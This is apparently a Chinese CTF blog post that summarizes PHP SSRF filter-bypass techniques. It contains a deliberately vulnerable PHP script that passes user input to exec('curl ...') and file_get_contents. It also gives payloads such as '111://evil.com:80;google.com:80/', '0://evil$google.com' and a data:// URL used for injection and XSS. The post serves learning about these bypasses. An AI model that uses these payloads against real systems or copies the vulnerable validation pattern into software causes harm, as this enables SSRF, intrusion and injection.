---
title: 'PHP SSRF Techniques'
date: 2019-08-21
updated: 2019-09-15
category: 'ctf'
tags:
  - 'php'
  - 'web'
lang: 'zh'
draft: false
---
## 写前面

这篇文章讲的实在是太棒了 [https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51](https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51)

php版本：

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php4.png)

测试代码：

```php
<?php
   echo "Argument: ".$argv[1]."\n";
   // check if argument is a valid URL
   if(filter_var($argv[1], FILTER_VALIDATE_URL)) {
      // parse URL
      $r = parse_url($argv[1]);
      print_r($r);
      // check if host ends with google.com
      if(preg_match('/google\.com$/', $r['host'])) {
         // get page from URL
         exec('curl -v -s "'.$r['host'].'"', $a);
         print_r($a);
      } else {
         echo "Error: Host not allowed";
      }
   } else {
      echo "Error: Invalid URL";
   }
?>
```

首先调用了`filter_var`进行URL的验证，然后再用`parse_url`去解析URL，php7的版本中这个函数是没有问题的

同时通过`preg_match`函数限定只能以`google.com`结尾

如果达到ssrf呢？

正常情况下

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php5.png)

攻击者：

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php6.png)

此时$r\[‘host’\]显然不是以`google.com`结尾的

## 绕过URL验证和正则表达式

> 许多URL schema保留某些特殊含义的字符：它们在URL的特定于方案的部分中的外观具有指定的语义。如果在方案中保留对应于八位字节的字符，则必须对八位字节进行编码。字符“;”，“/”，“？”，“：”，“@”，“=”和“＆”可以保留用于方案内的特殊含义。在方案中不能保留其他字符。

![什么是URL schema](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php7.png)

通常会用一些保留字符，比如`;`和`=`，`,`分割参数和参数值

一个可能是用`name;v=1.1`来表示name=version 1.1,然而也可以用`name,1.1`达到相同的效果，这根据算法来区分

curl或者wget会认为`evil.com;google.com`中`hostname`为`evil.com`,`querystring`为`google.com`

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php8.png)

但是并没有绕过`filter_var`函数  
`filter_var()`函数可以解析很多不同的URL scheme

如果改成这样：

![随便改，改成不认识的就行](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php9.png)

此时已经成功地绕过了URL验证和正则表达式

但是curl命令却没有执行，于是考虑加上端口号

再次修改：

`php test.php "111://evil.com:80;google.com:80/"`  
![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php10.png)

同样用逗号也行

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php11.png)

parse\_url只会尽可能地分割URL，而不是验证它，作者还提到了一种更好的方式：

`0://evil$google.com`

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php12.png)

注意这里必须用单引号括起来。。

## 实现XSS

作者之后修改了代码：

```php
<?php
   echo "Argument: ".$argv[1]."\n";
   // check if argument is a valid URL
   if(filter_var($argv[1], FILTER_VALIDATE_URL)) {
      // parse URL
      $r = parse_url($argv[1]);
      print_r($r);
      // check if host ends with google.com
      if(preg_match('/google\.com$/', $r['host'])) {
         // get page from URL
         $a = file_get_contents($argv[1]);
         echo($a);
      } else {
         echo "Error: Host not allowed";
      }
   } else {
      echo "Error: Invalid URL";
   }
?>
```

作者想要注入一点东西,但是并没有成功  
![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php13.png)

继续尝试：

`data://google.com/plain;base64,SSBsb3ZlIFBIUAo=`

![此时注入成功了](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php14.png)

那么XSS就很容易了

## 参考

[PHP SSRF Techniques](https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51)

[  
Some trick in ssrf and unserialize()](https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize\()/)
